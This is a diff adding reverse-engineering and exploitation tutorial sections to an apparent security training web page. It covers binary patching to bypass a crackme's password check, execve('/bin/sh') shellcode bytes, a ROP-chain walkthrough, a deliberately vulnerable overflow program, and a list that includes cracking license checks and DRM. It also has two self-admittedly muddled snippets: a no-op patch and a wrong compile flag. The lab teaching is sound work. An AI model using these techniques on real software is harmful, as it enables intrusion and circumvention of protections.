+#   return;
+# }
+
+# 5. Data Type Manager (bottom left)
+# Shows structs, enums, typedefs
+
+# 6. Console (bottom)
+# Error messages, script output
+
+# Navigation:
+# • Double-click function name → jumps to function
+# • Press G → Go to address
+# • Press F → Find bytes/text
+# • Press ; → Add comment
+# • Press L → Rename variable/function
+# • Press → → Follow reference
+# • Press ← → Go back
+
+# Keyboard shortcuts:
+# G → Go to address
+# F → Search
+# L → Rename
+# ; → Comment
+# Ctrl+Shift+E → Edit function signature
+# D → Data type (convert bytes to string, int, etc.)
+# U → Undefined (undefine instruction/data)
+# P → Create function
+# Right-click → References to → See where used</div>
+
+            <h4>Real Example: Reversing crackme Binary</h4>
+
+            <div class="code"># Download practice crackme:
+wget https://crackmes.one/static/crackme/5b8a37a433c5d45fc286ad83.zip
+unzip 5b8a37a433c5d45fc286ad83.zip
+chmod +x crackme
+
+# Run it:
+./crackme
+# Enter password: test
+# Output: Wrong password!
+
+# Import into Ghidra:
+# File → Import File → crackme
+
+# Auto-analyze
+
+# Find main function:
+# Symbol Tree → Functions → main (or entry)
+
+# Look at decompiled code:
+
+# undefined8 main(void)
+# {
+#   char input [32];
+#   
+#   printf("Enter password: ");
+#   scanf("%s", input);
+#   
+#   if (strcmp(input, "sup3rs3cr3t") == 0) {
+#     printf("Correct! Flag: flag{you_did_it}\n");
+#   } else {
+#     printf("Wrong password!\n");
+#   }
+#   
+#   return 0;
+# }
+
+# Found it! Password is: sup3rs3cr3t
+
+# Try it:
+./crackme
+# Enter password: sup3rs3cr3t
+# Correct! Flag: flag{you_did_it}
+
+# More complex scenario: Obfuscated password check
+
+# Decompiled code might show:
+# if ((((input[0] ^ 0x42) == 0x11) && ((input[1] ^ 0x42) == 0x27)) &&
+#     (((input[2] ^ 0x42) == 0x21 && ((input[3] ^ 0x42) == 0x21)))) {
+#   printf("Correct!\n");
+# }
+
+# Solve with Python:
+# >>> chr(0x11 ^ 0x42)
+# 'S'
+# >>> chr(0x27 ^ 0x42)
+# 'e'
+# >>> chr(0x21 ^ 0x42)
+# 'c'
+# >>> chr(0x21 ^ 0x42)
+# 'c'
+# Password: Secc</div>
+
+            <h4>Ghidra Scripting with Python</h4>
+
+            <div class="code"># Ghidra supports Python and Java scripts
+# Automate analysis tasks!
+
+# Create script:
+# Window → Script Manager → New Script
+# Name: find_strings.py
+# Language: Python
+
+# Example script - Find all strings containing "password":
+
+from ghidra.program.model.listing import CodeUnitFormat
+
+currentProgram = getCurrentProgram()
+listing = currentProgram.getListing()
+
+# Get all strings
+string_list = []
+for string in currentProgram.getListing().getDefinedData(True):
+    if string.getDataType().getName() == "string":
+        string_list.append(string.getValue())
+
+# Filter for "password"
+for s in string_list:
+    if "password" in s.lower():
+        print("Found: {}".format(s))
+
+# Run script:
+# Script Manager → find_strings.py → Run
+
+# Output:
+# Found: Enter password:
+# Found: Wrong password!
+# Found: hardcoded_password_123
+
+# Advanced script - Rename all functions with their string references:
+
+from ghidra.program.model.symbol import RefType
+
+def rename_functions_by_strings():
+    fm = currentProgram.getFunctionManager()
+    functions = fm.getFunctions(True)  # Get all functions
+    
+    for func in functions:
+        # Get all references from this function
+        refs = func.getBody().getAddresses(True)
+        for addr in refs:
+            data = listing.getDataAt(addr)
+            if data and data.getDataType().getName() == "string":
+                string_val = data.getValue()
+                # Rename function
+                new_name = "func_" + string_val[:20].replace(" ", "_")
+                func.setName(new_name, ghidra.program.model.symbol.SourceType.USER_DEFINED)
+                print("Renamed to: {}".format(new_name))
+                break
+
+rename_functions_by_strings()
+
+# This auto-renames functions based on strings they use!</div>
+
+            <h3>Part 2: radare2 - Command-Line RE Framework</h3>
+
+            <p><strong>radare2</strong> (r2) is a powerful command-line reverse engineering framework. It's fast, scriptable, and works over SSH!</p>
+
+            <div class="code"># Install radare2:
+sudo apt install radare2
+
+# Or latest version:
+git clone https://github.com/radareorg/radare2
+cd radare2
+sys/install.sh
+
+# Verify:
+r2 -v
+# radare2 5.8.8 @ linux-x86-64
+
+# Open binary:
+r2 /bin/ls
+
+# Or with write mode (allows patching):
+r2 -w /tmp/crackme
+
+# Basic r2 commands:
+
+# Analyze all:
+[0x00000000]> aaa
+
+# Output:
+# [x] Analyze all flags starting with sym. and entry0 (aa)
+# [x] Analyze function calls (aac)
+# [x] Analyze len bytes of instructions for references (aar)
+# [x] Finding and parsing C++ vtables (avrr)
+# [x] Skipping function emulation in debugger (aaef)
+# [x] Analyzing function calls in rtti sections (aafr)
+# [x] Type matching analysis for all functions (aaft)
+# [x] Propagate noreturn information (aanr)
+# [x] Use -AA or aaaa to perform additional experimental analysis
+
+# List functions:
+[0x00000000]> afl
+
+# Output:
+# 0x00401000    1 42           entry0
+# 0x00401030    1 6            sym.imp.printf
+# 0x00401040    1 6            sym.imp.scanf
+# 0x00401050    4 50   -> 40   main
+
+# Disassemble function:
+[0x00000000]> pdf @ main
+
+# Output:
+# ┌ 50: int main (int argc, char **argv);
+# │           ; DATA XREF from entry0 @ 0x401016
+# │           0x00401050      55             push rbp
+# │           0x00401051      4889e5         mov rbp, rsp
+# │           0x00401054      4883ec20       sub rsp, 0x20
+# │           0x00401058      488d3dc90000.  lea rdi, str.Enter_password:
+# │           0x0040105f      e8ccffffff     call sym.imp.printf
+# │           0x00401064      488d45e0       lea rax, [rbp - 0x20]
+# │           0x00401068      4889c6         mov rsi, rax
+# │           0x0040106b      488d3dc10000.  lea rdi, 0x00401033
+# │           0x00401072      b800000000     mov eax, 0
+# │           0x00401077      e8c4ffffff     call sym.imp.scanf
+
+# Decompile to pseudo-C:
+[0x00000000]> pdc @ main
+
+# Output (pseudo-C):
+# void main (void) {
+#     char *input;
+#     printf("Enter password: ");
+#     scanf("%s", &input);
+#     if (strcmp(input, "sup3rs3cr3t") == 0) {
+#         printf("Correct!\n");
+#     } else {
+#         printf("Wrong!\n");
+#     }
+# }
+
+# Search for strings:
+[0x00000000]> iz
+
+# Output:
+# [Strings]
+# Num Paddr      Vaddr      Len Size Section  Type  String
+# 000 0x00002008 0x00402008  15  16 (.rodata) ascii Enter password:
+# 001 0x00002018 0x00402018  11  12 (.rodata) ascii sup3rs3cr3t
+# 002 0x00002024 0x00402024   8   9 (.rodata) ascii Correct!
+
+# Search for hex bytes:
+[0x00000000]> /x 4889e5
+
+# Find references to address:
+[0x00000000]> axt 0x00402018
+
+# Output:
+# main 0x401058 [DATA] lea rdi, str.sup3rs3cr3t
+
+# Visual mode (TUI interface):
+[0x00000000]> V
+
+# Then press:
+#   p → cycle views (hex, disasm, decompiler)
+#   : → command mode
+#   q → quit visual mode</div>
+
+            <h4>Binary Patching with radare2</h4>
+
+            <div class="code"># Open binary in write mode:
+r2 -w crackme
+
+# Find password check:
+[0x00000000]> aaa
+[0x00000000]> pdf @ main
+
+# Let's say at 0x401077 there's:
+# 0x00401077      e8c4ffffff     call sym.strcmp
+# 0x0040107c      85c0           test eax, eax
+# 0x0040107e      7510           jne 0x401090  ← Jump if NOT equal
+
+# Patch JNE to JE (jump if equal → always jump):
+[0x00000000]> s 0x0040107e
+[0x0040107e]> pd 1
+
+# Output:
+# 0x0040107e      7510           jne 0x401090
+
+# Write new instruction (JE = 0x74):
+[0x0040107e]> wx 7510
+
+# Wait, that's the same! Let's NOP it instead:
+[0x0040107e]> wx 9090
+
+# Or make it always jump (change JNE to JMP):
+[0x0040107e]> wa jmp 0x401090
+
+# Verify:
+[0x0040107e]> pd 1
+# 0x0040107e      eb10           jmp 0x401090
+
+# Save and quit:
+[0x0040107e]> q
+
+# Now any password works!
+./crackme
+# Enter password: wrong
+# Correct!
+
+# More patching examples:
+
+# NOP out entire function call:
+[0x00000000]> s 0x401077
+[0x00000000]> wx 9090909090  # 5 NOPs (5-byte call instruction)
+
+# Change string:
+[0x00000000]> s 0x402018  # Address of "sup3rs3cr3t"
+[0x00402018]> w hello
+[0x00402018]> ps  # Print string
+# hello
+
+# Write shellcode:
+[0x00000000]> wx 31c048bbd19d9691d08c97ff48f7db53545f995257545e0f05
+# (x64 execve("/bin/sh") shellcode)</div>
+
+            <h4>radare2 Essential Commands Cheat Sheet</h4>
+
+            <div class="info-box">
+                <h4>r2 Command Reference</h4>
+                <p><strong>Analysis:</strong><br>
+                • <code>aa</code> - Analyze all functions<br>
+                • <code>aaa</code> - Analyze all (deep)<br>
+                • <code>aaaa</code> - Analyze all + experimental<br>
+                • <code>afl</code> - List functions<br>
+                • <code>afi</code> - Function info<br>
+                • <code>afn newname</code> - Rename function<br><br>
+                <strong>Disassembly:</strong><br>
+                • <code>pdf</code> - Print disassembly of function<br>
+                • <code>pd 20</code> - Print 20 instructions<br>
+                • <code>pdc</code> - Print decompiled C<br>
+                • <code>px 100</code> - Print 100 bytes hex<br><br>
+                <strong>Navigation:</strong><br>
+                • <code>s main</code> - Seek to main<br>
+                • <code>s 0x401000</code> - Seek to address<br>
+                • <code>s+ 10</code> - Seek forward 10 bytes<br>
+                • <code>s-</code> - Undo seek<br><br>
+                <strong>Searching:</strong><br>
+                • <code>/ password</code> - Search string<br>
+                • <code>/x 4889e5</code> - Search hex<br>
+                • <code>iz</code> - List strings<br>
+                • <code>axt</code> - Cross-references to<br><br>
+                <strong>Patching:</strong><br>
+                • <code>wx 9090</code> - Write hex<br>
+                • <code>wa jmp 0x401000</code> - Write assembly<br>
+                • <code>w hello</code> - Write string<br><br>
+                <strong>Visual mode:</strong><br>
+                • <code>V</code> - Enter visual mode<br>
+                • <code>VV</code> - Visual graph mode<br>
+                • <code>p</code> - Cycle views<br>
+                • <code>:</code> - Command mode</p>
+            </div>
+
+            <h3>Part 3: Binary Ninja - Modern RE Platform</h3>
+
+            <p><strong>Binary Ninja</strong> (binja) is a modern, commercial reverse engineering platform with beautiful UI and powerful IL (Intermediate Language) analysis. It has a free "Cloud" version and paid Personal ($299) and Commercial ($3999) licenses.</p>
+
+            <div class="code"># Download Binary Ninja:
+# https://binary.ninja/
+
+# Free options:
+# • Binary Ninja Cloud (browser-based, limited)
+# • Binary Ninja Personal (30-day trial)
+
+# Install on Kali:
+wget https://cdn.binary.ninja/installers/binaryninja_linux_demo.zip
+unzip binaryninja_linux_demo.zip
+cd binaryninja
+./binaryninja
+
+# Key features over Ghidra/r2:
+
+# 1. Clean, modern UI
+# No cluttered NSA-style interface
+
+# 2. Multiple IL views:
+#   - Disassembly (raw assembly)
+#   - Low-Level IL (LLIL) - architecture-independent
+#   - Medium-Level IL (MLIL) - variables, expressions
+#   - High-Level IL (HLIL) - pseudo-C
+#   - Pseudo-C (most readable)
+
+# 3. Workflow:
+# Open binary → Auto-analysis runs
+# 
+# Left panel: Function list
+# Center: Disassembly/IL
+# Right: Variable types, cross-references
+# Bottom: Python console
+
+# 4. IL example:
+# Assembly view:
+# 00401000  push    ebp
+# 00401001  mov     ebp, esp
+# 00401003  sub     esp, 0x20
+
+# LLIL:
+# push(ebp)
+# ebp = esp
+# esp = esp - 0x20
+
+# MLIL:
+# int32_t var_20
+
+# HLIL:
+# (empty - just stack setup)
+
+# 5. Type system:
+# Define struct:
+# Right-click variable → Change Type → struct myStruct { int x; char* name; }
+# Binary Ninja propagates type info everywhere!
+
+# 6. Scripting (Python):
+# View → Python Console
+
+# Example: Find all calls to dangerous functions
+
+import binaryninja as binja
+
+dangerous_funcs = ["strcpy", "gets", "sprintf"]
+
+for func in bv.functions:
+    for call_site in func.call_sites:
+        call_target = call_site.function.name
+        if call_target in dangerous_funcs:
+            print(f"Dangerous call at {hex(call_site.address)}: {call_target}")
+
+# Output:
+# Dangerous call at 0x401234: strcpy
+# Dangerous call at 0x401567: gets
+
+# Binary Ninja plugins:
+# Tools → Manage Plugins
+
+# Popular plugins:
+# • SENinja (symbolic execution)
+# • Binjago (Go reverse engineering)
+# • Sourcery Pane (sync with source code)
+
+# Limitations:
+# • Expensive ($299-$3999)
+# • Closed source
+# • Smaller community than Ghidra
+
+# Best for:
+# • Professional reverse engineering
+# • Companies with budget
+# • Complex binaries needing IL analysis</div>
+
+            <h3>Part 4: GDB Debugging - Runtime Analysis</h3>
+
+            <p><strong>GDB</strong> (GNU Debugger) is THE standard Linux debugger. While Ghidra/r2/Binja analyze static binaries, GDB runs them and lets you control execution!</p>
+
+            <div class="code"># GDB basics:
+
+# Compile test program with debug symbols:
+cat > test.c << 'EOF'
+#include <stdio.h>
+
+int add(int a, int b) {
+    return a + b;
+}
+
+int main() {
+    int x = 5;
+    int y = 10;
+    int result = add(x, y);
+    printf("Result: %d\n", result);
+    return 0;
+}
+EOF
+
+gcc -g test.c -o test  # -g = include debug symbols
+
+# Start GDB:
+gdb ./test
+
+# GDB commands:
+
+# List source code:
+(gdb) list
+
+# Output:
+# 3       int add(int a, int b) {
+# 4           return a + b;
+# 5       }
+# 6
+# 7       int main() {
+# 8           int x = 5;
+# 9           int y = 10;
+# 10          int result = add(x, y);
+
+# Set breakpoint:
+(gdb) break main
+# Breakpoint 1 at 0x401136: file test.c, line 8.
+
+# Or by line number:
+(gdb) break 10
+
+# Or by address:
+(gdb) break *0x401136
+
+# Run program:
+(gdb) run
+
+# Output:
+# Starting program: /root/test
+# Breakpoint 1, main () at test.c:8
+# 8           int x = 5;
+
+# Step through code:
+(gdb) next  # Execute one line (step over functions)
+# 9           int y = 10;
+
+(gdb) next
+# 10          int result = add(x, y);
+
+(gdb) step  # Step INTO function
+# add (a=5, b=10) at test.c:4
+# 4           return a + b;
+
+# Print variables:
+(gdb) print x
+# $1 = 5
+
+(gdb) print y
+# $2 = 10
+
+(gdb) print result
+# $3 = 0  (not set yet)
+
+# Continue execution:
+(gdb) continue
+# Result: 15
+# [Inferior 1 (process 1234) exited normally]
+
+# Examining memory:
+(gdb) x/4x $rsp  # Examine 4 hex words at stack pointer
+# 0x7fffffffe000: 0x00000000 0x00000001 0xffffe010 0x00007fff
+
+(gdb) x/s 0x402000  # Examine string at address
+# 0x402000: "Hello World"
+
+# Modify variables:
+(gdb) set variable x = 100
+
+# Call functions:
+(gdb) call printf("Debug message\n")
+# Debug message
+
+# Disassemble:
+(gdb) disassemble main
+# Dump of assembler code for function main:
+#    0x0000000000401130 <+0>:     push   %rbp
+#    0x0000000000401131 <+1>:     mov    %rsp,%rbp
+#    0x0000000000401134 <+4>:     sub    $0x10,%rsp</div>
+
+            <h4>GDB with PEDA/GEF/Pwndbg Extensions</h4>
+
+            <div class="code"># GDB is powerful but ugly. Extensions make it beautiful!
+
+# PEDA (Python Exploit Development Assistance):
+git clone https://github.com/longld/peda.git ~/peda
+echo "source ~/peda/peda.py" >> ~/.gdbinit
+
+# GEF (GDB Enhanced Features):
+wget -O ~/.gdbinit-gef.py -q https://gef.blah.cat/py
+echo "source ~/.gdbinit-gef.py" >> ~/.gdbinit
+
+# Pwndbg (Exploit Development):
+git clone https://github.com/pwndbg/pwndbg
+cd pwndbg
+./setup.sh
+
+# Features these add:
+
+# 1. Beautiful UI with colors
+# • Registers displayed with colors (red = changed)
+# • Stack view with annotations
+# • Code context around current instruction
+
+# 2. Exploit development commands:
+
+# Find ROP gadgets:
+(gdb) rop --search "pop rdi"
+# 0x00401234: pop rdi; ret
+# 0x00401567: pop rdi; pop rsi; ret
+
+# Search for strings:
+(gdb) searchmem "password"
+# [stack] 0x7fffffffe100 0x7fffffffe110 "password123"
+
+# Pattern create (find offset for buffer overflow):
+(gdb) pattern create 200
+# Generate: Aa0Aa1Aa2Aa3...
+
+# After crash:
+(gdb) pattern offset $rsp
+# Offset: 72 (crash happens at byte 72)
+
+# Check security features:
+(gdb) checksec
+# RELRO:    Partial RELRO
+# Stack:    No canary found
+# NX:       NX enabled
+# PIE:      No PIE
+
+# Shellcode helpers:
+(gdb) shellcode generate x64
+# \x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff...
+
+# Heap commands:
+(gdb) heap chunks
+# (shows all heap allocations)
+
+(gdb) heap bins
+# (shows freed chunks in bins)</div>
+
+            <h3>Part 5: ELF Analysis (Linux Binaries)</h3>
+
+            <div class="code"># ELF (Executable and Linkable Format) is Linux binary format
+
+# File command (identify binary type):
+file /bin/ls
+
+# Output:
+# /bin/ls: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
+# dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
+# BuildID[sha1]=1234567890abcdef, for GNU/Linux 3.2.0,
+# stripped
+
+# Key info:
+# • ELF 64-bit (architecture)
+# • LSB (little-endian)
+# • dynamically linked (uses shared libraries)
+# • stripped (no debug symbols)
+
+# readelf - Display ELF structure:
+
+# ELF header:
+readelf -h /bin/ls
+
+# Output:
+# ELF Header:
+#   Magic:   7f 45 4c 46 02 01 01 00
+#   Class:                             ELF64
+#   Data:                              2's complement, little endian
+#   Entry point address:               0x5850
+
+# Section headers:
+readelf -S /bin/ls
+
+# Output:
+#   [Nr] Name              Type             Address           Offset
+#   [ 0]                   NULL             0000000000000000  00000000
+#   [13] .text             PROGBITS         0000000000003000  00003000
+#   [14] .fini             PROGBITS         0000000000017008  00017008
+#   [23] .data             PROGBITS         0000000000019000  00019000
+#   [24] .bss              NOBITS           0000000000019100  00019100
+
+# Sections explained:
+# .text     → Executable code
+# .data     → Initialized global variables
+# .rodata   → Read-only data (strings, constants)
+# .bss      → Uninitialized global variables
+# .plt      → Procedure Linkage Table (dynamic linking)
+# .got      → Global Offset Table (dynamic linking)
+
+# Program headers (segments):
+readelf -l /bin/ls
+
+# Output:
+# Program Headers:
+#   Type           Offset             VirtAddr           PhysAddr
+#   LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
+#   LOAD           0x0000000000003000 0x0000000000003000 0x0000000000003000
+#   DYNAMIC        0x0000000000018000 0x0000000000018000 0x0000000000018000
+
+# Symbol table (if not stripped):
+readelf -s /bin/ls
+
+# Output:
+#    Num:    Value          Size Type    Bind   Vis      Ndx Name
+#     55: 0000000000005850   123 FUNC    GLOBAL DEFAULT   13 main
+#    123: 0000000000006500    45 FUNC    GLOBAL DEFAULT   13 read_file
+
+# Dynamic section (imported libraries):
+readelf -d /bin/ls
+
+# Output:
+#  0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
+#  0x0000000000000001 (NEEDED)             Shared library: [libpthread.so.0]
+
+# objdump - Disassemble binary:
+
+objdump -d /bin/ls | less
+
+# Output:
+# 0000000000005850 <main>:
+#     5850:       55                      push   %rbp
+#     5851:       48 89 e5                mov    %rsp,%rbp
+#     5854:       41 57                   push   %r15
+
+# Disassemble specific function:
+objdump -d /bin/ls | grep -A 20 "<main>:"
+
+# Show all strings:
+objdump -s /bin/ls | grep -i "password"
+
+# strings - Extract printable strings:
+strings /bin/ls
+
+# Output:
+# /lib64/ld-linux-x86-64.so.2
+# libc.so.6
+# __cxa_finalize
+# __libc_start_main
+# cannot access %s
+# [...]
+
+# ldd - Show dynamic library dependencies:
+ldd /bin/ls
+
+# Output:
+#     linux-vdso.so.1 (0x00007ffff7fc9000)
+#     libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c00000)
+#     /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcb000)
+
+# ltrace - Trace library calls:
+ltrace ls
+
+# Output:
+# strrchr("/bin/ls", '/')                = "/ls"
+# malloc(120)                            = 0x5555555592a0
+# opendir(".")                           = 0x555555559750
+# readdir(0x555555559750)                = 0x555555559770
+# strcmp(".", ".")                       = 0
+# [...]
+
+# strace - Trace system calls:
+strace ls
+
+# Output:
+# execve("/bin/ls", ["ls"], 0x7fffffffde80 /* 20 vars */) = 0
+# brk(NULL)                               = 0x555555559000
+# openat(AT_FDCWD, ".", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3
+# [...]</div>
+
+            <h3>Part 6: PE Analysis (Windows Binaries)</h3>
+
+            <div class="code"># PE (Portable Executable) is Windows binary format
+
+# Install PE tools on Kali:
+sudo apt install pev
+
+# readpe - Display PE structure:
+readpe malware.exe
+
+# Output:
+# PE File Header:
+#   Machine: IMAGE_FILE_MACHINE_AMD64 (x64)
+#   Number of sections: 5
+#   Timestamp: 2026-01-08 10:30:00 UTC
+#   Entry point: 0x1400
+# 
+# Optional Header:
+#   Magic: PE32+ (64-bit)
+#   Subsystem: Windows GUI
+#   DLL Characteristics: 0x8160
+#     - DYNAMIC_BASE (ASLR)
+#     - NX_COMPAT (DEP)
+#     - TERMINAL_SERVER_AWARE
+
+# pesec - Check security features:
+pesec malware.exe
+
+# Output:
+# ASLR:               Yes
+# DEP/NX:             Yes
+# SEH:                Yes
+# CFG:                No
+# SafeSEH:            No
+# Signed:             No
+
+# pestr - Extract strings:
+pestr malware.exe
+
+# Output:
+# kernel32.dll
+# VirtualAlloc
+# CreateThread
+# C:\Windows\System32\
+# http://malicious-c2.com/beacon
+# [...]
+
+# pehash - Calculate hashes:
+pehash malware.exe
+
+# Output:
+# MD5:     1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
+# SHA-1:   a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0
+# SHA-256: abc123...
+
+# pedis - Disassemble entry point:
+pedis malware.exe
+
+# Output:
+# 0x1400: push   rbp
+# 0x1401: mov    rbp, rsp
+# 0x1404: sub    rsp, 0x20
+# 0x1408: call   0x2000
+
+# Use Ghidra for deeper PE analysis:
+# Import PE → Ghidra auto-detects:
+#   - Import Address Table (IAT)
+#   - Export Address Table (EAT)
+#   - Resources (icons, dialogs, strings)
+#   - TLS callbacks
+#   - Exception handlers
+
+# Common PE sections:
+# .text     → Code
+# .data     → Initialized data
+# .rdata    → Read-only data (import table, string literals)
+# .bss      → Uninitialized data
+# .rsrc     → Resources (icons, dialogs, bitmaps)
+# .reloc    → Relocation table (for ASLR)
+
+# Packed PE detection:
+# If .text section has high entropy (7.5+) → likely packed
+
+# Unpacking with UPX:
+upx -d malware.exe -o malware_unpacked.exe
+
+# If different packer:
+# • Run in debugger, let it unpack itself
+# • Dump memory after unpacking
+# • Use automated unpackers (de4dot for .NET)</div>
+
+            <div class="metaphor-box">
+                <h4>🎉 You're a Reverse Engineering Expert!</h4>
+                <p>You've mastered:<br><br>
+                ✅ <strong>Ghidra:</strong> NSA's free RE suite, decompilation, scripting, project management<br>
+                ✅ <strong>radare2:</strong> Command-line beast, disassembly, patching, portable analysis<br>
+                ✅ <strong>Binary Ninja:</strong> Modern platform, IL analysis, clean UI<br>
+                ✅ <strong>GDB:</strong> Runtime debugging, breakpoints, PEDA/GEF/Pwndbg extensions<br>
+                ✅ <strong>ELF Analysis:</strong> Linux binaries, readelf, objdump, sections, segments<br>
+                ✅ <strong>PE Analysis:</strong> Windows binaries, pev tools, security features<br><br>
+                <strong>RE Workflow:</strong><br>
+                1. <strong>Reconnaissance:</strong> file, strings, readelf/readpe, checksec<br>
+                2. <strong>Static analysis:</strong> Ghidra/r2/Binja → understand logic<br>
+                3. <strong>Dynamic analysis:</strong> GDB → observe runtime behavior<br>
+                4. <strong>Exploitation:</strong> Find vulns, craft exploits, patch binaries<br><br>
+                <strong>Real-world applications:</strong><br>
+                • <strong>Malware analysis:</strong> Understand what virus/ransomware does<br>
+                • <strong>Vulnerability research:</strong> Find 0-days in proprietary software<br>
+                • <strong>Cracking:</strong> Bypass license checks, DRM, authentication<br>
+                • <strong>Protocol RE:</strong> Reverse engineer network protocols<br>
+                • <strong>Interoperability:</strong> Make closed-source software work with your tools<br>
+                • <strong>CTFs:</strong> Reverse engineering challenges<br><br>
+                <strong>Next steps:</strong><br>
+                • Practice on crackmes.one (100+ challenges)<br>
+                • Analyze real malware (use VM!)<br>
+                • Learn x86/x64 assembly deeply<br>
+                • Study common vulnerability patterns (buffer overflow, integer overflow, format string)<br>
+                • Contribute to Ghidra/r2 plugins<br><br>
+                Every binary is a puzzle waiting to be solved. You now have the tools! 🧩🔓</p>
+            </div>
         </section>
 
         <!-- SECTION 7: Advanced Exploitation Techniques -->
         <section id="advanced-exploitation" class="section">
             <h2 class="section-title">Advanced Exploitation Techniques</h2>
-            <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
+            <p class="section-intro">You know buffer overflows from Bonus B1. Now we go DEEP: ROP chains (Return-Oriented Programming), heap exploitation, kernel exploits, and fuzzing. Modern binaries have defenses: DEP/NX (no code execution on stack), ASLR (randomized addresses), stack canaries (overflow detection), PIE (position-independent code). Simple stack smashing doesn't work anymore! Advanced exploitation bypasses ALL these protections. This section covers how modern exploits work, how attackers chain vulnerabilities, and how to find 0-days with fuzzing. By the end, you'll understand CVEs you see in the news!</p>
+
+            <div class="metaphor-box">
+                <h4>💡 Modern Exploitation = Chess, Not Checkers</h4>
+                <p>Old-school exploitation (1990s-2000s):<br>
+                1. Find buffer overflow<br>
+                2. Overwrite return address<br>
+                3. Point to shellcode on stack<br>
+                4. Win!<br><br>
+                Modern exploitation (2010s-now):<br>
+                1. <strong>Stack canary blocks overflow</strong> → Leak canary first<br>
+                2. <strong>DEP/NX prevents shellcode execution</strong> → Use ROP chains instead<br>
+                3. <strong>ASLR randomizes addresses</strong> → Leak libc address, calculate offsets<br>
+                4. <strong>PIE randomizes code</strong> → Leak code address too<br>
+                5. Chain all these together → Win!<br><br>
+                You can't just "overflow and win" anymore. Modern exploits are multi-stage puzzles requiring information leaks, gadget chaining, and creative thinking. It's beautiful! 🧩</p>
+            </div>
+
+            <h3>Part 1: ROP (Return-Oriented Programming)</h3>
+
+            <h4>The Problem: DEP/NX Prevents Shellcode Execution</h4>
+
+            <div class="info-box">
+                <h4>What is DEP/NX?</h4>
+                <p><strong>DEP</strong> (Data Execution Prevention - Windows) / <strong>NX</strong> (No-eXecute - Linux) marks memory pages as either writable OR executable, never both!<br><br>
+                <strong>Traditional stack-based shellcode:</strong><br>
+                1. Write shellcode to stack (writable memory)<br>
+                2. Jump to stack<br>
+                3. Execute shellcode<br><br>
+                <strong>With NX enabled:</strong><br>
+                Stack is writable but NOT executable → Segmentation fault!<br><br>
+                <strong>Check if binary has NX:</strong><br>
+                <code>checksec --file=./vuln</code><br>
+                Output: <code>NX: NX enabled</code><br><br>
+                <strong>Solution:</strong> Don't execute our own code. Instead, chain together existing executable code ("gadgets") to build exploitation!</p>
+            </div>
+
+            <h4>ROP Gadgets Explained</h4>
+
+            <div class="code"># A "gadget" is a sequence of instructions ending in RET
+
+# Example gadgets from libc:
+
+# Gadget 1:
+0x00401234: pop rdi ; ret
+
+# Gadget 2:
+0x00401567: pop rsi ; ret
+
+# Gadget 3:
+0x004018ab: pop rdx ; ret
+
+# Gadget 4:
+0x00405678: pop rax ; ret
+
+# Gadget 5:
+0x00408901: syscall ; ret
+
+# Why gadgets work:
+# 1. They're in .text section (executable!)
+# 2. We control the stack (writable!)
+# 3. RET instruction pops address from stack and jumps there
+# 4. We can chain gadgets by placing their addresses on stack!
+
+# ROP chain to call system("/bin/sh"):
+
+# Goal:
+# rdi = pointer to "/bin/sh"  (first argument)
+# rsi = 0                     (second argument)
+# rdx = 0                     (third argument)
+# rax = 59                    (syscall number for execve)
+# syscall
+
+# Stack layout:
+# [buffer padding]
+# [address of "pop rdi; ret"]     ← return address (after overflow)
+# [address of "/bin/sh"]          ← will be popped into rdi
+# [address of "pop rsi; ret"]     ← after first gadget returns
+# [0x0]                           ← will be popped into rsi
+# [address of "pop rdx; ret"]
+# [0x0]                           ← will be popped into rdx
+# [address of "pop rax; ret"]
+# [59]                            ← execve syscall number
+# [address of "syscall"]          ← triggers execve!
+
+# Execution flow:
+# 1. Buffer overflow overwrites return address → points to first gadget
+# 2. First gadget: pop rdi; ret
+#    - Pops next stack value into rdi ("/bin/sh" address)
+#    - Returns to next stack value (second gadget)
+# 3. Second gadget: pop rsi; ret
+#    - Pops 0 into rsi
+#    - Returns to third gadget
+# 4. ... continues ...
+# 5. Final gadget: syscall
+#    - Executes syscall with our controlled registers!
+#    - Shell spawned! 🎉</div>
+
+            <h4>Finding ROP Gadgets</h4>
+
+            <div class="code"># Tool 1: ROPgadget (best tool!)
+
+sudo apt install python3-ropgadget
+
+# Find gadgets in binary:
+ROPgadget --binary ./vuln
+
+# Output (thousands of gadgets):
+# 0x00401234 : pop rdi ; ret
+# 0x00401567 : pop rsi ; ret
+# 0x004018ab : pop rdx ; ret
+# 0x00405678 : pop rax ; ret
+# 0x00408901 : syscall
+# [... 2000+ more gadgets ...]
+
+# Find specific gadget:
+ROPgadget --binary ./vuln --only "pop|ret"
+
+# Find gadgets containing "rdi":
+ROPgadget --binary ./vuln | grep rdi
+
+# Find gadgets in libc (more gadgets!):
+ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6
+
+# Tool 2: ropper
+
+sudo apt install ropper
+
+ropper --file ./vuln
+
+# Interactive mode:
+(ropper)> search pop rdi
+# [INFO] Searching for gadgets: pop rdi
+
+# 0x00401234: pop rdi; ret
+
+(ropper)> search syscall
+# 0x00408901: syscall; ret
+
+# Tool 3: pwntools (Python library)
+
+from pwn import *
+
+elf = ELF('./vuln')
+rop = ROP(elf)
+
+# Automatically find gadgets:
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+print(f"pop rdi; ret → {hex(pop_rdi)}")
+
+# Or use pwntools to build ROP chain automatically:
+rop.call('system', ['/bin/sh'])
+print(rop.dump())
+
+# Pwntools assembles entire chain for you!</div>
+
+            <h4>Example: Complete ROP Exploit</h4>
+
+            <div class="code"># Vulnerable program (vuln.c):
+cat > vuln.c << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void vuln() {
+    char buffer[64];
+    read(0, buffer, 200);  // Buffer overflow!
+}
+
+int main() {
+    vuln();
+    return 0;
+}
+EOF
+
+# Compile without stack canary, with NX:
+gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie
+# Wait, we want NX enabled, not execstack!
